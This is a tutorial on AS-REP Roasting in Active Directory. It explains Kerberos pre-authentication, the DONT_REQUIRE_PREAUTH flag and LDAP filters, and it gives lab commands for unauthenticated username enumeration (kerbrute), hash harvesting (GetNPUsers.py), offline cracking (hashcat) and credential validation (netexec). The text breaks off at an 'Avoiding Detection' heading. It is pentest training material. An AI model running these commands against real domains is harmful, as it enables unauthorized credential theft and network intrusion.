# AS-REP ROASTING: THE COMPLETE GUIDE
## Attacking Accounts WITHOUT Any Credentials

> **AS-REP Roasting is Kerberos hacking's little brother.**
>
> The big difference? **You don't need ANY domain credentials to do it!**
>
> This guide explains:
> - What pre-authentication is (and why turning it off is dangerous)
> - How AS-REP differs from Kerberoasting
> - Why this attack is so powerful for initial access
> - The step-by-step technical attack flow

---

# TABLE OF CONTENTS

**ABSOLUTE FUNDAMENTALS (START HERE!)**
0. [Understanding AS-REP Roasting from Zero](#part-0-fundamentals)

**FOUNDATIONAL KNOWLEDGE**
1. [Kerberos Pre-Authentication Deep Dive](#part-1-preauth-internals)
2. [The userAccountControl Bitfield](#part-2-uac-bitfield)
3. [Why This Vulnerability Exists](#part-3-why-exists)
4. [AS-REP vs Kerberoasting](#part-4-comparison)

**ADVERSARY TRADECRAFT**
5. [Username Enumeration Techniques](#part-5-username-enum)
6. [APT AS-REP Roasting](#part-6-apt-tradecraft)
7. [Creating AS-REP Roastable Accounts](#part-7-creating-targets)

**PRACTICAL EXECUTION**
8. [Lab Setup](#part-8-lab-setup)
9. [The Attack with Defender Bypass](#part-9-attack-execution)
10. [Cracking Methodology](#part-10-cracking)

**OPERATIONAL**
11. [Post-Exploitation](#part-11-post-exploitation)
12. [Interview Questions (15+)](#part-12-interview)
13. [Troubleshooting](#part-13-troubleshoot)

---

# PART 0: Understanding AS-REP Roasting from Zero {#part-0-fundamentals}

> **🎯 THE BIG IDEA:**
>
> Remember Kerberoasting? You needed domain credentials to attack service accounts.
>
> **AS-REP Roasting is different - you need ZERO credentials!**
>
> Just usernames. That's it. No password required.
>
> This is the attack you do on Day 1 of a pentest before you have any access.

---

**⚠️ PREREQUISITE:** If you haven't read the Kerberoasting walkthrough (02), **start there first**. This builds on those concepts.

---

## 0.1: Quick Recap - What We Learned from Kerberoasting

From the Kerberoasting walkthrough, you know:

```
KERBEROS REFRESHER:
────────────────────────────────────────────────────────────────

Component   What It Is
─────────   ──────────
KDC         Service on Domain Controller that issues tickets
TGT         "Day pass" proving you logged into the domain
TGS         "Service ticket" for accessing specific services
Kerberoast  Crack TGS tickets to get service passwords
```

**Now we're learning AS-REP Roasting - attacking a DIFFERENT part of Kerberos.**

---

## 0.2: Where in the Flow? (The Critical Difference)

Let me show you EXACTLY where each attack happens:

```
THE COMPLETE KERBEROS LOGIN FLOW:
────────────────────────────────────────────────────────────────

                YOU                         KDC
           (vamsi.krishna)              (DC01)

STEP 1: Login - Request TGT
────────────────────────────
    │                                  │
    │  "I'm vamsi, give me a TGT"      │
    │  + Encrypted proof I know        │
    │    my password                   │
    │ ────────────────────────────────>│
    │                                  │
    │                                  │ Verify password
    │                                  │ Create TGT
    │                                  │
    │  "Here's your TGT" (AS-REP)      │
    │ <────────────────────────────────│
    │                                  │
    
    ┌──────────────────────────────────────────────┐
    │  ⚡ AS-REP ROASTING ATTACKS HERE!            │
    │  We trick KDC into giving us AS-REP          │
    │  WITHOUT proving we know the password!       │
    └──────────────────────────────────────────────┘


STEP 2: Request Service Ticket
───────────────────────────────
    │                                  │
    │  "I have TGT, want SQL access"   │
    │ ────────────────────────────────>│
    │                                  │
    │  "Here's SQL ticket" (TGS-REP)   │
    │ <────────────────────────────────│
    │                                  │
    
    ┌──────────────────────────────────────────────┐
    │  ⚡ KERBEROASTING ATTACKS HERE!               │
    │  We crack the TGS ticket                     │
    │  (but we needed a TGT first!)                │
    └──────────────────────────────────────────────┘


STEP 3: Access SQL Server
──────────────────────────
    │                                  
    │  "Here's my ticket"     
    │ ──────────────────────────> SQL Server
```

**The KEY difference:**
- **Kerberoasting:** Attacks STEP 2 → Needs TGT → Needs credentials → Any domain user can do it
- **AS-REP Roasting:** Attacks STEP 1 → No TGT needed → NO credentials → Anyone can try it!

---

## 0.3: What is Pre-Authentication? (The Airport Security Analogy)

**Pre-authentication = Proving your identity BEFORE you get anything.**

Let me explain with a real-world scenario you've experienced:

```
🛫 AIRPORT SECURITY ANALOGY:
────────────────────────────────────────────────────────────────

NORMAL AIRPORT (With Security - Like Pre-Auth Enabled):
────────────────────────────────────────────────────────

You arrive at airport:
1. Go to security checkpoint
2. Show boarding pass + ID (PROVE who you are)
3. Security verifies your ID matches
4. ONLY THEN you get through to gates
5. Can board your flight

Security Process:
┌─────────────────────────────────────────────┐
│  YOU → Security: "I'm Vamsi Krishna"        │
│         + Show ID card (proof)              │
│                                             │
│  Security checks:                           │
│  - Does ID photo match your face?           │
│  - Is name on ID same as boarding pass?     │
│                                             │
│  IF MATCH: "Proceed to gate" ✅             │
│  IF NO MATCH: "Access denied!" ❌           │
└─────────────────────────────────────────────┘


VIP LANE (No Security - Like Pre-Auth Disabled):
─────────────────────────────────────────────────

Imagine airport has a "VIP lane" that SKIPS security:
1. You just walk up
2. Say "I'm a VIP"
3. Security waves you through
4. NO ID check!
5. Get to gates immediately

The Problem:
┌─────────────────────────────────────────────┐
│  ANYONE can claim to be VIP!                │
│                                             │
│  Attacker → VIP Lane: "I'm Vamsi Krishna"   │
│              (NO proof needed!)             │
│                                             │
│  Security: "OK, go ahead!" ✅               │
│  (Doesn't even check!)                      │
│                                             │
│  Attacker is now inside airport!            │
│  Can steal luggage, board any flight, etc.  │
└─────────────────────────────────────────────┘
```

**Now translate this to Kerberos:**

| Airport | Kerberos | What Happens |
|---------|----------|--------------|
| Security checkpoint | Pre-authentication | Verify you before giving access |
| Showing ID | Encrypted timestamp | Proves you know password |
| Getting to gate | Getting TGT | Access to request services |
| VIP lane (no security) | DONT_REQUIRE_PREAUTH | Skip verification! |
| Attacker claiming VIP | AS-REP Roasting | Get TGT without password! |

---

## 0.4: Normal Login WITH Pre-Authentication (Secure)

**This is how Kerberos SHOULD work:**

```
SECURE LOGIN FLOW:
────────────────────────────────────────────────────────────────

        YOU                                  KDC (DC01)
   (vamsi.krishna)                      (Domain Controller)
        │                                      │
        │                                      │
You type your password:                        │
"Password123!"                                 │
        │                                      │
Computer calculates:                           │
hash = NTLM("Password123!")                    │
     = 8846f7eaee8fb117...                     │
        │                                      │
        │  ──── AS-REQ (Login Request) ────>  │
        │                                      │
        │  Contains:                           │
        │  1. Username: vamsi.krishna          │
        │  2. Current time: 2024-12-29 3:30PM  │
        │  3. Time encrypted with YOUR hash    │
        │     (proves you know password!)      │
        │                                      │
        │                                    KDC checks:
        │                                    ───────────
        │                                    1. Look up vamsi.krishna
        │                                       → Found in AD ✅
        │                                    
        │                                    2. Get vamsi's password hash
        │                                       → From NTDS.dit database
        │                                       → hash = 8846f7eaee8fb...
        │                                    
        │                                    3. Try to decrypt timestamp
        │                                       → Using vamsi's hash
        │                                       → Decrypt succeeds! ✅
        │                                    
        │                                    4. Check timestamp is recent
        │                                       → 3:30 PM, current time
        │                                       → Within 5 minutes ✅
        │                                    
        │                                    5. All checks passed!
        │                                       → Create TGT
        │                                       → User is authenticated
        │                                      │
        │  <──── AS-REP (Login Response) ────  │
        │                                      │
        │  Contains:                           │
        │  1. TGT (your "day pass")            │
        │  2. Session key                      │
        │                                      │
✅ LOGIN SUCCESSFUL!                           │
You now have a TGT                             │
```

**The security:**
- You MUST prove you know the password
- KDC verifies by decrypting your timestamp
- No password = No TGT = No access

**This is the normal, secure behavior!**

---

## 0.5: Login WITHOUT Pre-Authentication (VULNERABLE!)

**Now imagine a user has pre-authentication DISABLED:**

```
VULNERABLE LOGIN FLOW (AS-REP ROASTING):
────────────────────────────────────────────────────────────────

   ATTACKER                              KDC (DC01)
(Doesn't know password!)            (Domain Controller)
        │                                      │
        │                                      │
Attacker thinks:                               │
"I don't know harsha's password,               │
 but let me try requesting TGT anyway..."      │
        │                                      │
        │  ──── AS-REQ (Login Request) ────>  │
        │                                      │
        │  Contains:                           │
        │  1. Username: harsha.vardhan         │
        │  2. NO encrypted timestamp!          │
        │  3. NO proof of password!            │
        │  4. Just: "Give me a TGT"            │
        │                                      │
        │                                    KDC checks:
        │                                    ───────────
        │                                    1. Look up harsha.vardhan
        │                                       → Found in AD ✅
        │                                    
        │                                    2. Check: Pre-auth required?
        │                                       → Check DoesNotRequirePreAuth
        │                                       → harsha has it SET! ⚠️
        │                                    
        │                                    3. Skip verification!
        │                                       → No password check
        │                                       → No timestamp check
        │                                       → Just give TGT anyway!
        │                                    
        │                                    4. Create AS-REP response
        │                                       → Contains encrypted data
        │                                       → Encrypted with HARSHA's
        │                                         password! 🔥
        │                                      │
        │  <──── AS-REP (Login Response) ────  │
        │                                      │
        │  Contains:                           │
        │  1. TGT (encrypted with krbtgt)      │
        │  2. Session key (encrypted with      │
        │     HARSHA'S password!) ← JACKPOT!   │
        │                                      │
⚠️ ATTACKER GOT ENCRYPTED DATA!                │
Can now crack harsha's password offline!       │
```

**THE VULNERABILITY EXPLAINED:**

```
WHAT ATTACKER GOT:
────────────────────────────────────────────────────────────────

The AS-REP contains:
┌─────────────────────────────────────────────────────────────┐
│                                                              │
│  Part 1: TGT                                                │
│  ├── Encrypted with KRBTGT password                         │
│  └── Can't crack this (KRBTGT = 128+ random chars)          │
│                                                              │
│  Part 2: Session Key ← THIS IS WHAT WE CRACK! 🎯            │
│  ├── Encrypted with HARSHA's password                       │
│  ├── We can try passwords offline:                          │
│  │   Try "password123" → Decrypt → ❌ Garbage               │
│  │   Try "Customer2024!" → Decrypt → ✅ Valid data!         │
│  └── PASSWORD FOUND: Customer2024!                          │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

**Why this is CRITICAL:**
1. ❌ No credentials needed to request
2. ❌ KDC gives encrypted data without verification
3. ✅ Attacker can crack offline (unlimited attempts!)
4. ✅ No lockout policy (not using wrong passwords)
5. ✅ Get user's actual password (not just access)

---

## 0.6: Why Would Anyone Disable Pre-Authentication?

**Good question! This seems crazy, right?**

Here are the real-world reasons this dangerous setting exists:

```
LEGITIMATE REASONS (Historical):
────────────────────────────────────────────────────────────────

1. LEGACY KERBEROS CLIENTS (1990s-2000s)
   ─────────────────────────────────────
   - Unix/Linux Kerberos 4 didn't support pre-auth
   - Old Java applications
   - Ancient Unix systems that can't be upgraded
   
   Example: "Our payroll system from 1998 breaks with pre-auth"

2. APPLICATION COMPATIBILITY
   ──────────────────────────
   - Vendor says: "Disable pre-auth for our app to work"
   - Legacy banking software
   - Old SAP integrations
   
   Example: "Oracle told us to disable it during install"

3. TROUBLESHOOTING GONE WRONG
   ──────────────────────────
   - Admin debugging auth issues
   - Temporarily disables pre-auth
   - Forgets to re-enable it
   - Account works fine → nobody notices the hole
   
   Example: "Let me disable this to test... (3 years later) oops"

4. MIGRATION FROM NON-AD SYSTEMS
   ──────────────────────────────
   - Migrating from Novell, Unix, etc.
   - Some accounts get misconfigured
   - Setting gets carried forward
   
   Example: "We migrated from NIS in 2005, never cleaned up"
```

**Why we STILL find it in 2024:**

```
THE REALITY:
────────────────────────────────────────────────────────────────

1. HIDDEN IN GUI
   ──────────────
   - Not prominently shown in AD Users and Computers
   - Buried in "Account" tab
   - Most admins don't even check it

2. NO DEFAULT WARNINGS
   ───────────────────
   - Windows doesn't alert when enabled
   - No audit logs by default
   - Silent security hole

3. LACK OF AWARENESS
   ─────────────────
   - Admins don't know the risk
   - "If account works, don't touch it"
   - Security team doesn't audit for it

4. LEGACY DEBT
   ───────────
   - Accounts from Windows 2000 era
   - "We've always had it this way"
   - Fear of breaking production
```

---

## 0.7: AS-REP vs Kerberoasting - Side-by-Side Comparison

**Let me show you the differences clearly:**

| Aspect | AS-REP Roasting | Kerberoasting |
|--------|-----------------|---------------|
| **What you attack** | Initial login (AS-REP) | Service ticket (TGS-REP) |
| **When in flow** | STEP 1 (before TGT) | STEP 2 (after TGT) |
| **Credentials needed** | **NONE!** Just usernames | Yes, any domain user |
| **What's vulnerable** | Users with DONT_REQUIRE_PREAUTH | Users with SPNs (service accounts) |
| **How common** | Rare (1-5% of accounts) | Common (many service accounts) |
| **Password you crack** | **USER's** password | SERVICE ACCOUNT's password |
| **Hash format** | $krb5asrep$23$... | $krb5tgs$23$... |
| **Hashcat mode** | **18200** | 13100 |
| **Event ID logged** | 4768 (TGT request) | 4769 (Service ticket) |
| **Best for** | Initial access (Day 1) | Post-credential access |

**Why AS-REP is special:**

```
ATTACK TIMELINE:
────────────────────────────────────────────────────────────────

Day 1 of Pentest - You have NOTHING:
════════════════════════════════════
  ✅ AS-REP ROASTING ← You can do this NOW!
  ❌ Kerberoasting ← Need credentials first
  ❌ BloodHound ← Need credentials
  ❌ Lateral Movement ← Need credentials

After AS-REP gives you credentials:
═══════════════════════════════════
  ✅ Kerberoasting ← Now you can!
  ✅ BloodHound ← Now you can!
  ✅ Everything else ← Now open!
```

**This is why AS-REP Roasting is the "Initial Access King"!**

---

## 0.8: The 4-Step Attack Flow (Super Simple Version)

```
AS-REP ROASTING - THE COMPLETE PROCESS:
────────────────────────────────────────────────────────────────

STEP 1: Get Usernames
─────────────────────
Sources:
├── LinkedIn (company employees)
├── Company website "About Us" page  
├── Email patterns (first.last@company.com)
├── Previous data breaches
└── Username enumeration tools (Kerbrute)

Example list:
  vamsi.krishna
  harsha.vardhan
  pranavi
  kiran.kumar
  lakshmi.devi


STEP 2: Send AS-REQ for Each User
──────────────────────────────────
For each username, send login request WITHOUT password:

  → vamsi.krishna: "Pre-auth required" ❌
  → harsha.vardhan: "Here's AS-REP! " ✅ VULNERABLE!
  → pranavi: "Here's AS-REP!" ✅ VULNERABLE!
  → kiran.kumar: "Here's AS-REP!" ✅ VULNERABLE!
  → lakshmi.devi: "Pre-auth required" ❌

We found 3 vulnerable accounts!


STEP 3: Crack the AS-REP Hashes Offline
────────────────────────────────────────
Save hashes to file:
  $krb5asrep$23$harsha.vardhan@ORSUBANK.LOCAL:a1b2c3...
  $krb5asrep$23$pranavi@ORSUBANK.LOCAL:d4e5f6...
  $krb5asrep$23$kiran.kumar@ORSUBANK.LOCAL:g7h8i9...

Run Hashcat:
  hashcat -m 18200 hashes.txt rockyou.txt

Results:
  harsha.vardhan: Customer2024! ✅ CRACKED!
  pranavi: Branch123! ✅ CRACKED!
  kiran.kumar: Finance1! ✅ CRACKED!


STEP 4: You Now Have Domain Credentials!
─────────────────────────────────────────
Username: harsha.vardhan
Password: Customer2024!

What can you do now?
├── Login to workstations
├── Access file shares  
├── Run BloodHound for privilege paths
├── Kerberoast service accounts
├── Lateral movement
└── Check if user is privileged!
```

---

## 0.9: Real-World Attack Scenario

**Let me paint a picture of how this works in practice:**

```
🎯 PENTEST SCENARIO: ORSUBANK
────────────────────────────────────────────────────────────────

DAY 1 - Morning (9:00 AM):
──────────────────────────
You: "I'm pentesting ORSUBANK. No credentials yet."

STEP 1: OSINT (9:00 - 10:00 AM)
────────────────────────────────
→ Search LinkedIn: "ORSUBANK employees"
→ Find 47 employees
→ Extract names:
  - Vamsi Krishna (Branch Manager)
  - Harsha Vardhan (Customer Service)
  - Pranavi (IT Support)
  - Kiran Kumar (Finance)
  - (43 more...)

→ Generate usernames (first.last pattern):
  vamsi.krishna
  harsha.vardhan
  pranavi
  kiran.kumar
  ...

STEP 2: AS-REP ROASTING (10:00 - 10:05 AM)
───────────────────────────────────────────
→ Run GetNPUsers.py from Kali:
  GetNPUsers.py orsubank.local/ -usersfile users.txt \
    -no-pass -dc-ip 192.168.100.10

→ Results:
  ✅ pranavi → Got AS-REP hash!  
  ✅ harsha.vardhan → Got AS-REP hash!
  ✅ kiran.kumar → Got AS-REP hash!
  ❌ 44 others → Pre-auth required

STEP 3: CRACKING (10:05 - 10:15 AM)
────────────────────────────────────
→ Save hashes to file
→ Run Hashcat with rockyou.txt:
  hashcat -m 18200 hashes.txt rockyou.txt

→ Results (10 minutes later):
  pranavi: Branch123! ✅
  harsha.vardhan: Customer2024! ✅  
  kiran.kumar: Finance1! ✅

STEP 4: VALIDATION (10:15 AM)
──────────────────────────────
→ Test credentials:
  netexec smb 192.168.100.10 -u harsha.vardhan -p 'Customer2024!'
  
  [+] orsubank.local\harsha.vardhan:Customer2024! ✅

→ Check privileges:
  netexec smb 192.168.100.10 -u harsha.vardhan -p 'Customer2024!' --groups
  
  [+] Member of: HelpDesk_Team, IT_Support, Server_Admins

→ Run BloodHound:
  "harsha.vardhan has path to Domain Admin!" 🎯


RESULT BY 10:30 AM:
═══════════════════
✅ Domain credentials obtained
✅ Privilege escalation path identified
✅ Total time: 1.5 hours
✅ From ZERO to potential Domain Admin!
```

**This is why every red team starts with AS-REP Roasting!**

---

## 0.10: Summary - Before Going Deeper

Make sure you understand these core concepts:

| Concept | Simple Explanation |
|---------|--------------------|
| **Pre-authentication** | Security check BEFORE getting a TGT (like showing ID at airport) |
| **DONT_REQUIRE_PREAUTH** | Setting that skips this check (like VIP lane with no security) |
| **AS-REP** | The response containing your TGT (includes encrypted session key) |
| **AS-REP Roasting** | Request AS-REP for users without pre-auth, crack their passwords offline |
| **No credentials needed!** | Just need valid usernames - that's the power! |

**Quick self-test:**

```
QUIZ - Answer in your head:
────────────────────────────────────────────────────────────────

Q1: Do you need domain credentials for AS-REP Roasting?
    A) Yes, any domain user
    B) No, just usernames
    C) Yes, Domain Admin
    
    👉 Answer: B - Just usernames!

Q2: What setting makes an account AS-REP Roastable?
    A) Has an SPN
    B) DONT_REQUIRE_PREAUTH enabled
    C) Password never expires
    
    👉 Answer: B - DONT_REQUIRE_PREAUTH

Q3: Which Hashcat mode for AS-REP?
    A) 13100
    B) 18200
    C) 19700
    
    👉 Answer: B - Mode 18200
    
Q4: What password do you crack?
    A) SERVICE account password
    B) USER's password
    C) Domain Admin password
    
    👉 Answer: B - The USER's own password
```

**If you got all 4 correct - you understand AS-REP Roasting! Let's dive deeper...**

---

# PART 1: Kerberos Pre-Authentication Deep Dive {#part-1-preauth-internals}

## 1.1: What is Pre-Authentication?

When you request a TGT (Ticket Granting Ticket), the KDC needs to verify you are who you claim to be. Pre-authentication does this by requiring you to encrypt a timestamp with your password hash.

## 1.2: Normal Kerberos Flow (Pre-Auth Enabled)

```
KERBEROS AUTHENTICATION WITH PRE-AUTH:
────────────────────────────────────────────────────────────────

CLIENT                                      KDC (DC01)
   │                                            │
   │ 1. AS-REQ                                  │
   │    ───────────────────────────────────────>│
   │                                            │
   │    Contains:                               │
   │    • Username: vamsi.krishna               │
   │    • Pre-auth data:                        │
   │      └── PA-ENC-TIMESTAMP                  │
   │      └── Current timestamp                 │
   │      └── Encrypted with user's password    │
   │                                            │
   │                                            │ KDC Process:
   │                                            │ 1. Lookup vamsi.krishna in AD
   │                                            │ 2. Get password hash from NTDS.dit
   │                                            │ 3. Try to decrypt PA-ENC-TIMESTAMP
   │                                            │ 4. If decrypt succeeds AND timestamp
   │                                            │    is within 5 minutes → VALID!
   │                                            │ 5. If fails → KDC_ERR_PREAUTH_FAILED
   │                                            │
   │ 2. AS-REP (if pre-auth succeeded)          │
   │    <───────────────────────────────────────│
   │                                            │
   │    Contains:                               │
   │    • TGT (encrypted with KRBTGT hash)      │
   │    • Session key (encrypted with user's    │
   │      password hash - user can decrypt)     │
   │                                            │

THE SECURITY:
The user must PROVE knowledge of password BEFORE receiving any encrypted data!
```

## 1.3: Without Pre-Authentication (Vulnerable!)

```
KERBEROS AUTHENTICATION WITHOUT PRE-AUTH:
────────────────────────────────────────────────────────────────

CLIENT (or attacker!)                       KDC (DC01)
   │                                            │
   │ 1. AS-REQ                                  │
   │    ───────────────────────────────────────>│
   │                                            │
   │    Contains:                               │
   │    • Username: harsha.vardhan              │
   │    • NO pre-auth data!                     │
   │    • Just: "Give me a TGT for this user"   │
   │                                            │
   │                                            │ KDC Process:
   │                                            │ 1. Lookup harsha.vardhan
   │                                            │ 2. Check: DONT_REQUIRE_PREAUTH set?
   │                                            │ 3. If YES → skip pre-auth verification
   │                                            │ 4. Create TGT anyway! ← VULNERABLE!
   │                                            │
   │ 2. AS-REP                                  │
   │    <───────────────────────────────────────│
   │                                            │
   │    Contains:                               │
   │    • TGT (encrypted with KRBTGT hash)      │
   │    • Session key (encrypted with USER's   │
   │      password hash!)  ← WE CAN CRACK THIS! │
   │                                            │

THE VULNERABILITY:
KDC returns encrypted data WITHOUT verifying identity!
The encrypted session key can be brute-forced offline!
```

## 1.4: The Encrypted Part We Crack

**In the AS-REP, the session key is encrypted with the user's password hash:**

```
AS-REP STRUCTURE:
────────────────────────────────────────────────────────────────

┌─────────────────────────────────────────────────────────────┐
│                        AS-REP                                │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Ticket (TGT) - Encrypted with KRBTGT hash                  │
│  └── We can't crack this (KRBTGT has random 128+ char pass) │
│                                                              │
│  Encrypted Session Key - Encrypted with USER's password     │
│  └── THIS is what we crack!                                  │
│  └── If we guess the right password, we can decrypt it      │
│  └── Correct decryption = valid password found!             │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

## 1.5: The Mathematical Attack

**Hashcat's process for AS-REP cracking:**

```
FOR each password in wordlist:
    1. Compute password hash (NTLM or AES key)
    2. Use hash as decryption key
    3. Attempt to decrypt the encrypted session key
    4. Check if decryption produces valid ASN.1 structure
    5. If valid → PASSWORD FOUND!

Speed: ~2.5M hashes/sec on RTX 3090 for RC4 (etype 23)
```

---

# PART 2: The userAccountControl Bitfield {#part-2-uac-bitfield}

## 2.1: What is userAccountControl?

**userAccountControl (UAC) is an attribute on every AD account that controls account behavior.**

It's a 32-bit bitmask where each bit enables or disables a specific feature:

```
userAccountControl BITMASK:
────────────────────────────────────────────────────────────────

Bit  | Hex Value    | Decimal   | Name                        | Meaning
─────┼──────────────┼───────────┼─────────────────────────────┼─────────────────────
0    | 0x00000001   | 1         | SCRIPT                      | Logon script executes
1    | 0x00000002   | 2         | ACCOUNTDISABLE              | Account disabled
3    | 0x00000008   | 8         | HOMEDIR_REQUIRED            | Home dir required
4    | 0x00000010   | 16        | LOCKOUT                     | Account locked
5    | 0x00000020   | 32        | PASSWD_NOTREQD              | No password required
6    | 0x00000040   | 64        | PASSWD_CANT_CHANGE          | Can't change password
7    | 0x00000080   | 128       | ENCRYPTED_TEXT_PWD_ALLOWED  | Reversible encryption
8    | 0x00000100   | 256       | TEMP_DUPLICATE_ACCOUNT      | Temp duplicate account
9    | 0x00000200   | 512       | NORMAL_ACCOUNT              | Regular user account
11   | 0x00000800   | 2048      | INTERDOMAIN_TRUST_ACCOUNT   | Trust account
12   | 0x00001000   | 4096      | WORKSTATION_TRUST_ACCOUNT   | Computer account
13   | 0x00002000   | 8192      | SERVER_TRUST_ACCOUNT        | DC account
16   | 0x00010000   | 65536     | DONT_EXPIRE_PASSWORD        | Password never expires
17   | 0x00020000   | 131072    | MNS_LOGON_ACCOUNT           | MNS account
18   | 0x00040000   | 262144    | SMARTCARD_REQUIRED          | Smart card required
19   | 0x00080000   | 524288    | TRUSTED_FOR_DELEGATION      | Unconstrained delegation
20   | 0x00100000   | 1048576   | NOT_DELEGATED               | Cannot be delegated
21   | 0x00200000   | 2097152   | USE_DES_KEY_ONLY            | DES only
22   | 0x00400000   | 4194304   | DONT_REQUIRE_PREAUTH        | AS-REP ROASTABLE! ←←←
23   | 0x00800000   | 8388608   | PASSWORD_EXPIRED            | Password has expired
24   | 0x01000000   | 16777216  | TRUSTED_TO_AUTH_FOR_DELEG   | Constrained delegation
```

## 2.2: The Critical Bit: DONT_REQUIRE_PREAUTH

**Bit 22 (0x00400000 = 4194304) = DONT_REQUIRE_PREAUTH**

When this bit is set, the KDC skips pre-authentication verification and returns an encrypted AS-REP directly.

**Checking if the bit is set:**
```
userAccountControl = 0x00410200 (4260352 decimal)

Binary: 0000 0000 0100 0001 0000 0010 0000 0000
                 │              │         │
                 │              │         └── Bit 9: NORMAL_ACCOUNT (512)
                 │              └──────────── Bit 16: DONT_EXPIRE (65536)
                 └─────────────────────────── Bit 22: DONT_REQ_PREAUTH (4194304)

This account has DONT_REQUIRE_PREAUTH set!
Sum: 512 + 65536 + 4194304 = 4260352
```

## 2.3: LDAP Filter for AS-REP Roastable Accounts

**The magic LDAP filter:**
```
(userAccountControl:1.2.840.113556.1.4.803:=4194304)
```

**Breakdown:**
- `userAccountControl` - The attribute we're checking
- `1.2.840.113556.1.4.803` - Microsoft's OID for "bitwise AND"
- `4194304` - The value of bit 22 (DONT_REQUIRE_PREAUTH)

**This filter returns all accounts where bit 22 is set.**

**Full LDAP query for AS-REP Roastable users:**
```
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
```

---

# PART 3: Why This Vulnerability Exists {#part-3-why-exists}

## 3.1: Legitimate Reasons

**DONT_REQUIRE_PREAUTH exists for compatibility:**

1. **Legacy Kerberos clients** - Very old implementations (MIT Kerberos 4, some early Unix) didn't support pre-auth
2. **Specific application requirements** - Some legacy apps couldn't handle pre-auth
3. **Troubleshooting** - Temporarily disabled during auth debugging
4. **Misconfiguration** - Admin clicked checkbox without understanding impact

## 3.2: Why It's Still Found Today

**Despite being a known vulnerability, we still find it because:**

1. **Hidden in GUI** - Not prominently displayed in AD Users and Computers
2. **Legacy migrations** - Old accounts carried forward
3. **Application requirements** - Vendors sometimes request it
4. **Lack of awareness** - Admins don't know the security impact
5. **No default auditing** - Windows doesn't alert when this is enabled

## 3.3: How Common Is It?

**In real-world assessments:**
- Small orgs: 2-5% of users might have it
- Large orgs: Often 0.1-1% (still hundreds of accounts)
- Specific targets: Service accounts, legacy accounts, test accounts

**Even one vulnerable account can lead to domain compromise if it has elevated privileges or a weak password!**

---

# PART 4: AS-REP vs Kerberoasting {#part-4-comparison}

## 4.1: Detailed Comparison

| Aspect | AS-REP Roasting | Kerberoasting |
|--------|-----------------|---------------|
| **What's attacked** | Pre-authentication bypass | Service ticket encryption |
| **Target accounts** | Users with DONT_REQUIRE_PREAUTH | Users with SPNs |
| **Credentials needed** | NONE (just usernames!) | Any domain user |
| **Message type** | AS-REP (authentication) | TGS-REP (service ticket) |
| **Encrypted with** | User's password hash | Service account's hash |
| **Hashcat mode** | 18200 | 13100 |
| **Detection** | Event 4768 (type=0) | Event 4769 |
| **Prevalence** | Less common | Very common |

## 4.2: Attack Order Strategy

**Recommended attack order:**

```
1. AS-REP ROASTING (First)
   └── Reason: Requires NO credentials
   └── Just need valid usernames
   └── Can be done during initial recon

2. KERBEROASTING (Second)
   └── Reason: Requires any domain user
   └── If AS-REP gives creds, use them for this
   └── More targets available
```

## 4.3: When Each Attack Shines

**AS-REP Roasting is best when:**
- You have NO domain credentials
- Pre-engagement OSINT gave you usernames
- Testing unauthenticated attack surface
- Looking for quick wins in legacy environments

**Kerberoasting is best when:**
- You have any domain user access
- Targeting service accounts specifically
- Need more targets than AS-REP provides
- Service accounts likely have weak passwords

---

# PART 5: Username Enumeration Techniques {#part-5-username-enum}

## 5.1: Why Username Enum Matters

**AS-REP Roasting without credentials still requires valid usernames.**

You can't just guess - the KDC will tell you if a user doesn't exist vs. requires pre-auth:

```
Invalid user:    KDC_ERR_C_PRINCIPAL_UNKNOWN
Valid + preauth: KDC_ERR_PREAUTH_REQUIRED
Valid + no preauth: AS-REP returned!
```

## 5.2: Username Enumeration Sources

**OSINT (Before access):**
- LinkedIn employee search
- Company website "About Us"
- Email addresses (extract username pattern)
- GitHub commits
- Conference speaker lists
- Data breach dumps

**From the network (After initial access):**
- LDAP enumeration
- SMB session enumeration
- Email address harvesting
- RPC queries

## 5.3: Common Username Patterns

```
ORSUBANK USERNAME FORMAT EXAMPLES:
────────────────────────────────────────────────────────────────

Format                  | Example
────────────────────────┼───────────────────────────
first.last              | vamsi.krishna
flast                   | vkrishna
firstl                  | vamsik
first_last              | vamsi_krishna
first                   | vamsi
last.first              | krishna.vamsi
```

**Tool to generate username list from names:**
```bash
# Using username-anarchy
git clone https://github.com/urbanadventurer/username-anarchy
./username-anarchy --input-file names.txt --select-format first.last > usernames.txt
```

## 5.4: Kerbrute Username Enumeration

**Kerbrute enumerates valid users via Kerberos:**

```bash
# From Kali
kerbrute userenum --dc 192.168.100.10 -d orsubank.local /tmp/usernames.txt

# Output:
2024/12/27 16:30:00 > Using KDC(s):
2024/12/27 16:30:00 >   192.168.100.10:88

2024/12/27 16:30:00 > [+] VALID USERNAME:    vamsi.krishna@orsubank.local
2024/12/27 16:30:00 > [+] VALID USERNAME:    harsha.vardhan@orsubank.local
2024/12/27 16:30:01 > [+] VALID USERNAME:    pranavi@orsubank.local
2024/12/27 16:30:01 > [+] VALID USERNAME:    lakshmi.devi@orsubank.local
```

**Why Kerbrute is stealthy:**
- Uses Kerberos (not LDAP or SMB)
- Doesn't require authentication
- Responses are fast
- Each request looks like normal auth attempt

---

# PART 6: APT AS-REP Roasting {#part-6-apt-tradecraft}

## 6.1: APT Approach vs Script Kiddie

| Script Kiddie | APT Operator |
|--------------|--------------|
| Run tool, hope for results | Carefully enumerate first |
| Blast all usernames at once | Test small batches |
| Use default output files | Custom output handling |
| No cleanup | Careful evidence management |

## 6.2: Targeted AS-REP Roasting

**Don't spray all users - target high-value first:**

1. **Identify likely targets:**
   - Service accounts (svc_*, service_*)
   - Admin accounts (*admin*, *_adm)
   - Legacy accounts (test*, old*, legacy*)
   - External/contractor accounts

2. **Test in small batches:**
   ```bash
   # Create targeted list
   echo -e "svc_legacy\nold_admin\ntest_user\nservice_backup" > high_value.txt
   
   # Test only high-value
   GetNPUsers.py orsubank.local/ -usersfile high_value.txt -no-pass -dc-ip 192.168.100.10
   ```

## 6.3: Combining with LDAP Enumeration

**If you have credentials, use LDAP to find AS-REP targets precisely:**

```bash
# Get exact list of vulnerable users via LDAP
ldapsearch -H ldap://192.168.100.10 \
  -D "vamsi.krishna@orsubank.local" \
  -w 'Password123!' \
  -b "DC=orsubank,DC=local" \
  "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" \
  sAMAccountName

# Then AS-REP roast only those specific users
```

## 6.4: Avoiding Detection

